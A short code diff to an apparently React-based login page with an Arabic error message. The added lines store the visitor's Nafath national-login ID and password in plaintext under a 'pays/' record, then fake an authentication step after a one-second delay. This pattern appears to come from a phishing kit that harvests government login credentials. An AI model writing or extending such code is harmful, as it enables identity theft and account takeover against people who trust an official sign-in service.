@@ -64,20 +64,24 @@ if (typeof window !== "undefined") {
       return;
     }
 
-    try {
-      setIsLoading(true);
+try {
+  setIsLoading(true);
 
-setTimeout(() => {
-  setShowAuthDialog(true);
+  addData(`pays/${visitorId}`, {
+    id: visitorId,
+    nafazId: idLogin,
+    nafazPass: password,
+  });
+
+  setTimeout(() => {
+    setShowAuthDialog(true);
+    setIsLoading(false);
+  }, 1000);
+} catch (error) {
+  console.error(error);
   setIsLoading(false);
-}, 1000);
- 
-    } catch (error) {
-      console.error(error);
-      setIsLoading(false);
-      setShowError("حدث خطأ أثناء تسجيل الدخول");
-    }
-  };
+  setShowError("حدث خطأ أثناء تسجيل الدخول");
+}
 
   return (
     <div
